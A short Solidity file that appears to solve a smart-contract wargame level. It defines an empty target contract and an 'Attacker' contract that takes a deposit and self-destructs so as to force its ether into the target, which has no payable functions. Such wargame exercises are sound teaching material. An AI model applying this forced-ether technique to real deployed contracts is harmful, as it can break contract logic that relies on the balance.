// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


// Here we want to send the following contract some ether, but it does not contains payable functions.abi
// However there are two ways in solidity to do such a thing. 
// 1. Selfestruct another contract and send the ether in it to another address.
// 2. Sent ether to an address, before the contract has being deployed.
// We will use the first approach.
contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}

contract Attacker{
    Force private contractForce;

    constructor(address forceAddress){
        contractForce = Force(forceAddress);
    }

    function deposit() payable external{
        require(msg.value > 0);
    }

    function destructContractAndSendEthToForce() external{
        require(address(this).balance > 0);
        selfdestruct(payable(address(contractForce)));
    }
}